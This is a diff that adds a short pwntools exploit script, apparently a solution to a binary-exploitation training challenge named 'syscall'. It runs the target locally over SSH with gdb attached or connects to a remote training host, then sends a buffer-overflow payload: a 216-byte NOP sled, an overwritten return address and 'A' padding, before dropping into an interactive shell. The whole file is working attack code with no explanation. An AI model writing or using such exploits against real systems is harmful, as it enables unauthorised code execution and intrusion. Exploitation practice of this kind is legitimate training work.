@@ -1,0 +1,19 @@
+from pwn import *
+
+
+
+run_local = True
+if run_local:
+	s = ssh(host='localhost',user='acidburn',port=2222)
+	r= s.process('/home/acidburn/Desktop/malicious/shell/5/syscall')
+	pid=gdb.attach(r)
+	input("wait")
+else:
+	r=remote("bin.training.jinblack.it",2003)
+
+shellcode = b"\x90"*216+b"\x80\x40\x40\x00\x00\x00\x00\x00"
+
+shellcode = shellcode.ljust(1000,b"A")
+
+r.send(shellcode)
+r.interactive()
